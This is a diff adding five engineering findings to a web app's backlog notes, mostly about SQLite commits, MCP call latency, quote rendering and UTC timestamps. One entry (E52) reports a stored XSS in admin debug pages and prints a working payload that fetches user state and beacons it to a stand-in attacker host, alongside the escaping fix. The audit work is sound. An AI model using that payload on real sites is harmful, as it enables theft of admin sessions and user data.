@@ -596,3 +596,65 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 **Complexity:** S — add `conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")` at the end of the `_run_gc()` try-block (`app_server.py:5236-5242`). No schema changes, no new dependencies. The call is a no-op if no WAL pages need flushing (safe to call unconditionally). Touch: `app_server.py:5236-5244`.
 
 **Files:** `app_server.py:5229-5247` (`_run_gc`); `tests/agent/gc_thread_test.py` (add checkpoint assertion)
+
+---
+
+## 2026-06-08
+
+### E52 — Debug dashboard injects user content unescaped into HTML — stored XSS via chat messages (S)
+
+**What:** The `/debug/logs` HTML page is built at `app_server.py:3848-3885` by splicing database rows directly into f-strings: `row['prompt']`, `row['input']`, `row['output']`, `row['username']`, `row['error']`, `json.dumps(action['data'])`, and `action['errorMessage']` are all inserted without escaping. `import html` is absent from the file. A registered user who sends a chat message containing `</pre><img src=x onerror="fetch('/api/state',{headers:{Authorization:'Bearer TOKEN'}}).then(r=>r.json()).then(d=>navigator.sendBeacon('https://attacker.com',JSON.stringify(d)))">` gets that payload stored in `model_logs.input`. When the admin opens `/debug/logs`, the payload executes in their browser. The same pattern is present in the `/debug/errors` and `/debug/agent-dashboard` rendering blocks.
+
+**Why it matters:** OPT-028 restricted access to admin/loopback, but any registered user can plant a malicious message that persists in the top-100 log window. XSS against an admin session on a commercial app is a meaningful attack surface: the attacker can exfiltrate all users' state, forge API calls, or pivot to billing. Fixing it requires `import html` and wrapping each user-controlled f-string interpolation with `html.escape()` — a two-character function call per site.
+
+**Complexity:** S — `import html` (stdlib, no dependency) + `html.escape()` on the ~10 user-controlled interpolation sites at lines 3848-3885. Same fix applies to `/debug/errors` and `/debug/agent-dashboard` HTML builders. Zero functional change.
+
+**Files:** `app_server.py:3848-3885` (`/debug/logs` HTML builder); also scan `/debug/errors` (~line 3917) and `/debug/agent-dashboard` (~line 3950) rendering blocks for the same pattern.
+
+---
+
+### E53 — TraceManager commits after every individual event — 7-8 SQLite fsyncs per chat request (M)
+
+**What:** `TraceManager.create_trace()` calls `conn.commit()` at line 2687. `TraceManager.log_event()` calls `conn.commit()` at line 2697. `TraceManager.update_trace()` calls `conn.commit()` at line 2706. A single streaming chat request emits: 1 `create_trace` + ~5 `log_event` calls (REQUEST_RECEIVED, VALIDATED, LLM_CALLED, PARSED, ACTIONS_VALIDATED) + 1-2 `update_trace` calls = 7-8 commits. Each `conn.commit()` in WAL mode advances the WAL and, when enough pages accumulate, triggers a disk sync. With 240 requests/day, this generates 1,680-1,920 trace commits vs. 240 if batched per-request.
+
+**Why it matters:** Trace data is observability metadata — it does not need to be durably committed after every event, only at request completion. Batching all trace writes into a single commit at the end of each handler's lifecycle reduces WAL write amplification ~8× and decreases lock contention between concurrent requests on `agent_trace_events`. The change is safe: if the request fails mid-way, the whole trace batch is lost, which is acceptable for observability data (vs. user state where durability matters). The streaming handler already has a `finally` block (around line 4688) that closes the connection — adding `trace_manager.flush(conn)` there (before `conn.close()`) captures all deferred writes.
+
+**Complexity:** M — add `flush(conn)` method to `TraceManager` that calls `conn.commit()` once; set `auto_commit=False` parameter on the three methods (defaulting to current behavior for backward compat); add `trace_manager.flush(conn)` to the streaming handler's `finally` block (~line 4688) and the non-streaming handler's `finally` block (~line 5085). Touch: `app_server.py:2665-2706` (TraceManager class), `app_server.py:4688, 5085` (handler finally blocks).
+
+**Files:** `app_server.py:2665-2706` (TraceManager); `app_server.py:4688` (streaming handler finally); `app_server.py:5085` (non-streaming handler finally)
+
+---
+
+### E54 — MCP dispatcher spawns a full asyncio.run() per tool call — adds 50-150ms overhead per agent action (M)
+
+**What:** `MCPToolDispatcher.dispatch()` in `mcp_dispatcher.py` opens a new asyncio event loop, TCP-connects to the MCP server on port 8788, performs the MCP initialize handshake, calls the tool, then closes the connection — for every single invocation. The file's own docstring acknowledges: "实测 ~50-150ms" per call. Every `POST /api/agent/actions/{id}/execute` triggers one dispatch. A user approving 5 agent actions in sequence accumulates 250-750ms of extra latency from asyncio setup/teardown alone, even before the tool logic runs.
+
+**Why it matters:** The MCP server runs on the same host (port 8788 = localhost). A persistent connection would reduce per-call overhead from ~100ms to <10ms. The fastest approach: a module-level singleton that creates one asyncio event loop in a background thread and routes all dispatch calls through it via `asyncio.run_coroutine_threadsafe()`, reusing the same MCP session across calls. This is a ~30 line change to `mcp_dispatcher.py` and eliminates the dominant latency source for action execution.
+
+**Complexity:** M — create a `_MCPSession` singleton with a background event loop thread; replace the per-call `asyncio.run()` with `asyncio.run_coroutine_threadsafe(_call_tool(...), _loop).result(timeout=30)`. Handle reconnect on connection error. Touch: `mcp_dispatcher.py` (full dispatch refactor, ~60 lines); `app_server.py:28` (import unchanged).
+
+**Files:** `mcp_dispatcher.py` (full dispatch pattern); `tests/agent/` (add a test that dispatches two consecutive calls and asserts the second is faster, or mock the MCP client).
+
+---
+
+### E55 — `renderQuotes()` renders all N quotes synchronously with no display cap, unlike `renderTimeline()`'s slice(0,10) (M)
+
+**What:** `renderTimeline()` at `app.js:1289` caps the no-search view to `allSorted.slice(0, 10)`. `renderQuotes()` at `app.js:1385` renders ALL matching quotes via `quotes.map(...)` with no cap. For a user with 300 quotes, every `renderQuotes()` call — on state change, dialog close, OCR completion, tag filter change — synchronously builds 300 quote-card DOM nodes and assigns them in one `innerHTML` operation. On a mid-tier Android phone this blocks the main thread for ~30-50ms. E5 proposes debouncing the search-input trigger, which reduces call frequency; it does not reduce the per-call DOM cost. After the 200ms debounce fires, the render still processes all 300 cards.
+
+**Why it matters:** A "first 50 + load more" pattern consistent with `renderTimeline()`'s existing behaviour caps every `renderQuotes()` to ≤50 DOM operations regardless of collection size. For the common case (user not searching, opening the quotes tab), this turns a 30ms blocking render into a 5ms one. An `IntersectionObserver` sentinel at the bottom of the list can load the next batch automatically for a seamless scroll experience on mobile.
+
+**Complexity:** M — add `const QUOTES_PAGE_SIZE = 50` constant; in `renderQuotes()`, render `quotes.slice(0, renderedCount)` and append a "显示更多 (N 条)" button (or an invisible sentinel div for IntersectionObserver) if `quotes.length > renderedCount`; track `renderedCount` per filter state. Touch: `app.js:1353-1420` (`renderQuotes`), `styles.css` (load-more button style), no backend changes.
+
+**Files:** `app.js:1353-1420` (`renderQuotes`); `styles.css` (minor button style); `tests/frontend/` (new test for pagination behavior)
+
+---
+
+### E56 — `TraceManager` timestamps use `now_iso()` (naïve local time) — inconsistent with project UTC policy (S)
+
+**What:** `TraceManager.create_trace()` uses `now_iso()` at line 2676 for `created_at`/`updated_at`. `TraceManager.log_event()` uses `now_iso()` at line 2695. `TraceManager.update_trace()` uses `now_iso()` at line 2702. All three produce naïve local-time strings (e.g. `2026-06-08T21:00:00` on a UTC+8 server) while the rest of the codebase has migrated user-visible timestamps to `utc_now_iso()` (OPT-014, OPT-024, OPT-031). E44 already flags `save_state()`'s `updated_at`; TraceManager is a separate class that was missed in those fixes.
+
+**Why it matters:** Trace timestamps appear in the `/debug/agent-dashboard` page (admin-visible) and in `get_trace()` detail responses. Any future analytics that joins `agent_traces.created_at` against `user_state.updated_at` (e.g., to correlate state version with the triggering chat request) would show a spurious +8h skew on a UTC+8 server. Applying the UTC policy consistently closes the door on an entire class of future timezone bugs. The fix is three one-character changes.
+
+**Complexity:** S — replace `now_iso()` with `utc_now_iso()` at `app_server.py:2676, 2695, 2702`. No schema changes, no test changes (trace tests don't assert timestamp format). Touch: `app_server.py:2676, 2695, 2702`.
+
+**Files:** `app_server.py:2676` (`create_trace`), `app_server.py:2695` (`log_event`), `app_server.py:2702` (`update_trace`)
